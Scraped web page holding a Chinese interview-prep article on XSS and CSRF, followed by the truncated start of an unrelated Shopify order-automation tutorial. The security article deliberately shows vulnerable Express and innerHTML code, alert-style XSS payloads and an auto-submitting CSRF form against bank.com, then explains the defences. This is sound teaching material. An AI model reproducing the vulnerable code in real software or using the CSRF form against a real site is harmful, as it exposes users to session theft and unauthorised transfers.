content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            关于XSS和CSRF，面试官更喜欢这样的回答！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1410009035452887/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    秀秀不只会前端
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T07:56:43.000Z" title="Thu Nov 27 2025 07:56:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>这是我们前端最常见的两种攻击手段，也是面试中最常考的前端攻击。这篇文章我用最精炼、最优雅，也是面试官最喜欢的回答方式来讲解下 XSS 和 CSRF。</p>
</blockquote>
<h2 data-id="heading-0">一、XSS（跨站脚本）</h2>
<h3 data-id="heading-1">原理</h3>
<p>攻击者把 <strong>恶意脚本</strong> 注入到受信任页面并被浏览器执行，脚本 利用页面的信任上下文（Cookies、localStorage、DOM）窃取数据或劫持会话。</p>
<h3 data-id="heading-2">常见类型</h3>
<ul>
<li>​<strong>反射型</strong>​（参数或路径直接反射到页面并执行）</li>
<li>​<strong>存储型</strong>​（恶意内容存储在服务器，其他用户访问时触发）</li>
<li>​<strong>DOM-based</strong>​（客户端不安全的 DOM 操作导致执行，和服务器无关）</li>
</ul>
<h3 data-id="heading-3">最小复现示例（不安全的后端 + 不安全的前端）</h3>
<p><strong>后端（Express — 危险示例）</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// server.js（示例，仅演示不安全行为）</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/search'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span> || <span class="hljs-string">''</span>;
  <span class="hljs-comment">// 直接把用户输入拼到 HTML 中 —— 危险！</span>
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`&lt;html&gt;&lt;body&gt;搜索: <span class="hljs-subst">${q}</span>&lt;/body&gt;&lt;/html&gt;`</span>);
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p>访问 <code>/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code> 会执行脚本（反射型）。</p>
<p><strong>前端 DOM XSS（危险）</strong></p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"out"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">const</span> q = location.<span class="hljs-property">search</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">'q='</span>)[<span class="hljs-number">1</span>] || <span class="hljs-string">''</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'out'</span>).<span class="hljs-property">innerHTML</span> = q; <span class="hljs-comment">// 不转义 —— 危险（DOM XSS）</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">实战防范要点</h3>
<ol>
<li>​**输出编码（服务器端）**​：所有插入 HTML 的内容做 HTML 转义（<code>&amp;&lt;&gt;\"'</code>）。</li>
<li>​<strong>前端最小化 innerHTML</strong>​：尽量用框架绑定（React/Vue 的模板）替代 <code>innerHTML</code>。
<blockquote>
<p>框架框出来的插值（<code>{value}</code> / <code>{{ value }}</code>）会​<strong>自动做 HTML 转义</strong>​，把 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>"</code>、<code>'</code> 等关键字符替换成实体（<code>&amp;lt;</code> 等），从而把攻击脚本当文本显示，而不是执行。</p>
</blockquote>
</li>
<li>​<strong>富文本白名单清洗</strong>​：对于必须存储/渲染的 HTML（富文本），后端用白名单 sanitizer（比如 <code>bleach</code> / <code>html-sanitizer</code>），前端再用 DOMPurify 做一次保护，对标签属性等进行清洗。</li>
<li>​<strong>Content-Security-Policy（CSP）头部</strong>​：禁止内联脚本、只允许可信源。</li>
<li>​<strong>HttpOnly Cookie 头部</strong>​：token/cookie 设置 HttpOnly，防止被脚本直接读取（减轻 XSS 后果）。</li>
</ol>
<h3 data-id="heading-5">示例代码 — 安全改造</h3>
<p><strong>后端（Express + 转义）</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">escapeHtml</span> = s =&gt; <span class="hljs-title class_">String</span>(s)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&amp;/g</span>, <span class="hljs-string">'&amp;amp;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">'&amp;lt;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">'&amp;gt;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/"/g</span>, <span class="hljs-string">'&amp;quot;'</span>)
  .<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/'/g</span>, <span class="hljs-string">'&amp;#39;'</span>);

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/search'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> q = escapeHtml(req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span> || <span class="hljs-string">''</span>);
  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`&lt;html&gt;&lt;body&gt;搜索: <span class="hljs-subst">${q}</span>&lt;/body&gt;&lt;/html&gt;`</span>);
});
</code></pre>
<p><strong>前端（若必须渲染 HTML，用 DOMPurify）</strong></p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-comment">&lt;!-- npm install dompurify --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://unpkg.com/dompurify@2.&lt;!--version--&gt;/dist/purify.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"content"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-comment">// htmlFromServer 来自后端 API，仍需 sanitize</span>
  <span class="hljs-keyword">const</span> htmlFromServer = <span class="hljs-string">'&lt;img src=x onerror=alert(1)&gt;'</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'content'</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-title class_">DOMPurify</span>.<span class="hljs-title function_">sanitize</span>(htmlFromServer);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>设置 CSP（Nginx/Express header 示例）</strong></p>
<pre><code class="hljs language-Plain" lang="Plain">Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none';
</code></pre>
<h2 data-id="heading-6">二、CSRF（跨站请求伪造）</h2>
<h3 data-id="heading-7">原理</h3>
<p>利用用户已登录且浏览器会自动带上凭证（cookie）的特性，攻击者诱导用户发起对受信任站点的请求（如通过自动提交表单或图片请求），从而在用户 名下执行未授权操作。</p>
<h3 data-id="heading-8">最小复现示例（攻击者页面）</h3>
<p>如果 <code>bank.com/transfer</code> 接受 GET 或 POST 并依赖 cookie 验证，攻击页面可这样写：</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-comment">&lt;!-- auto.html（在攻击者域名上） --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"https://bank.com/transfer"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"POST"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"f"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"to"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"attacker"</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"amount"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"1000"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'f'</span>).<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>用户在已登录 <code>bank.com</code> 的情况下访问攻击页面时，浏览器会自动带上 <code>bank.com</code> 的 cookie，导致转账。</p>
<h3 data-id="heading-9">防护要点</h3>
<ol>
<li>​<strong>SameSite Cookie</strong>​：把 session/cookie 设置 <code>SameSite=Lax</code> 或 <code>Strict</code>（Lax 对 POST 有保护，适配大多数情形）。</li>
<li>​**CSRF Token（同步/双提交）**​：服务端生成随机 token，响应给前端；敏感请求必须携带并校验该 token。
<blockquote>
<p>该 token 不同于 jwt token ，此处的 csrf-token 只为配合 session+cookie 传统鉴权策略做安全防护。</p>
</blockquote>
</li>
<li>​<strong>检查 Origin/Referer</strong>​：对跨站请求校验 <code>Origin</code> 或 <code>Referer</code> 头（通常对 POST/PUT/DELETE 生效）。</li>
<li>​<strong>避免用 cookie 做对外 API 的认证</strong>​：采用 <code>Authorization: Bearer</code> header 的 token 机制（只有 JS 能读/写），结合 CORS 限制。</li>
<li>​<strong>敏感操作二次确认</strong>​：密码/OTP/二次验证。</li>
</ol>
<h3 data-id="heading-10">示例代码（Express + scrf token + csurf）</h3>
<blockquote>
<p><code>csurf</code> 使用 ​**双提交验证机制（CSRF Token）**​：</p>
<ol>
<li>服务端生成一个 CSRF Token，放在 cookie 或 session 中。</li>
<li>前端每次发 POST/PUT/DELETE 请求要带上这个 token，常放在请求头或表单隐藏字段，比如：<code>X-CSRF-Token: ey2423482374823748234</code></li>
<li>服务端校验 token，是否匹配、是否未过期、是否合法。</li>
</ol>
</blockquote>
<p><strong>后端（Express）</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// server.js</span>
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cookie-parser'</span>);
<span class="hljs-keyword">const</span> csurf = <span class="hljs-built_in">require</span>(<span class="hljs-string">'csurf'</span>);

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());
app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">csurf</span>({ <span class="hljs-attr">cookie</span>: { <span class="hljs-attr">httpOnly</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">sameSite</span>: <span class="hljs-string">'lax'</span> } }));

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/csrf-token'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// 返回 token 给 SPA 前端（用于后续请求 header）</span>
  res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">csrfToken</span>: req.<span class="hljs-title function_">csrfToken</span>() });
});

app.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/transfer'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  <span class="hljs-comment">// csurf 中间件会自动校验请求中的 token（_csrf 字段或 X-CSRF-Token header）</span>
  <span class="hljs-comment">// 执行转账逻辑...</span>
  res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">ok</span>: <span class="hljs-literal">true</span> });
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>);
</code></pre>
<p><strong>前端 SPA（获取 token 并在请求头中发送）</strong></p>
<pre><code class="hljs language-JavaScript" lang="JavaScript"><span class="hljs-comment">// 初始化时获取 token</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">init</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> r = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/csrf-token'</span>, { <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span> });
  <span class="hljs-keyword">const</span> { csrfToken } = <span class="hljs-keyword">await</span> r.<span class="hljs-title function_">json</span>();
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__CSRF_TOKEN</span> = csrfToken;
}

<span class="hljs-comment">// 发送受保护请求</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">transfer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/transfer'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">credentials</span>: <span class="hljs-string">'include'</span>, <span class="hljs-comment">// 仍然带 cookie</span>
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      <span class="hljs-string">'X-CSRF-Token'</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">__CSRF_TOKEN</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">to</span>: <span class="hljs-string">'bob'</span>, <span class="hljs-attr">amount</span>: <span class="hljs-number">100</span> })
  });
}
</code></pre>
<p>只用 SameSite（简洁替代，适用多数场景），在服务端设置 cookie：</p>
<pre><code class="hljs language-Plain" lang="Plain">Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/;
</code></pre>
<p>这就能阻止绝大多数通过第三方页面触发的 POST/跨站敏感操作。</p>
<h2 data-id="heading-11">三、XSS 与 CSRF 的关键总结</h2>
<p>概念：</p>
<ul>
<li>​<strong>XSS</strong>​：攻击者注入脚本并可读取页面内容（更强），根源是输出/DOM 不安全。</li>
<li>​<strong>CSRF</strong>​：攻击者伪造用户请求，无法直接读取响应，根源是浏览器自动带凭证。</li>
</ul>
<p>防护：</p>
<ol>
<li>后端统一使用 HTML escape 库；富文本走白名单 sanitizer。</li>
<li>全站 Cookie：<code>HttpOnly; Secure; SameSite=Lax</code>。</li>
<li>对需要的页面开启 CSP（report-only 先观测，再 enforce）。</li>
<li>SPA：首次获取 CSRF token 并在后续请求中以 header 发送；服务端检查 <code>Origin</code>/<code>Referer</code>。</li>
<li>CI/代码审查禁止随意使用 <code>innerHTML</code>/<code>eval</code>/<code>dangerouslySetInnerHTML</code>。</li>
<li>对关键操作实施二次验证（密码/OTP）。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别冗余！用Python + 星析API，一键自动化处理Shopify订单]]></title>    <link>https://juejin.cn/post/7576918517238497330</link>    <guid>https://juejin.cn/post/7576918517238497330</guid>    <pubDate>2025-11-27T05:48:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576918517238497330" data-draft-id="7576978338754412594" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别冗余！用Python + 星析API，一键自动化处理Shopify订单"/> <meta itemprop="keywords" content="运营,掘金日报"/> <meta itemprop="datePublished" content="2025-11-27T05:48:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="星析互联"/> <meta itemprop="url" content="https://juejin.cn/user/1370462103538153"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别冗余！用Python + 星析API，一键自动化处理Shopify订单
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1370462103538153/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    星析互联
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:48:22.000Z" title="Thu Nov 27 2025 05:48:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作为一名跨境卖家，你是否也曾疲于在Shopify、广告平台和物流商之间反复横跳？手动处理订单、更新物流信息，不仅效率低下，还极易出错。今天，就让我们用Python和星析API，打造一个专属的订单自动化流水线，把时间和精力还给选品与营销。</p>
<hr/>
<p>对于日订单量上百的跨境卖家而言，订单处理环节的“人效”是制约发展的关键瓶颈。客服手动导出订单、打包后又要手动上传单号、标记发货……这套流程不仅消耗了大量人力，而且在订单高峰期，任何一步的疏忽都可能导致发错货、漏发货等严重客诉。</p>
<p><strong>如何破局？答案是API自动化。</strong></p>
<p>星析跨境服务商为此提供了稳定、高效且文档清晰的RESTful API接口，允许开发者将星析强大的物流与订单管理能力，无缝集成到自己的业务系统中。</p>
<p><strong>实战：用Python构建Shopify订单自动化流程</strong></p>
<p>假设我们有这样一个核心需求：<strong>定时获取Shopify的新订单，并通过星析API自动完成发货操作。</strong>  下面，我们分步实现。</p>
<p><strong>第一步：环境准备与认证</strong></p>
<p>首先，确保你已安装了Python的<code>requests</code>库。星析API通常使用API Key进行认证，你可以在星析开发者后台获取它。
python</p>
<pre><code class="hljs language-makefile" lang="makefile">import requests
import json

<span class="hljs-comment"># 星析API配置</span>
XINGXI_API_KEY = <span class="hljs-string">"你的星析API密钥"</span>
XINGXI_BASE_URL = <span class="hljs-string">"https://api.xingxi.com/v1"</span> <span class="hljs-comment"># 示例地址，请以官方文档为准</span>

<span class="hljs-comment"># 设置请求头</span>
headers = {
    <span class="hljs-string">"Authorization"</span>: f<span class="hljs-string">"Bearer {XINGXI_API_KEY}"</span>,
    <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/json"</span>
}
</code></pre>
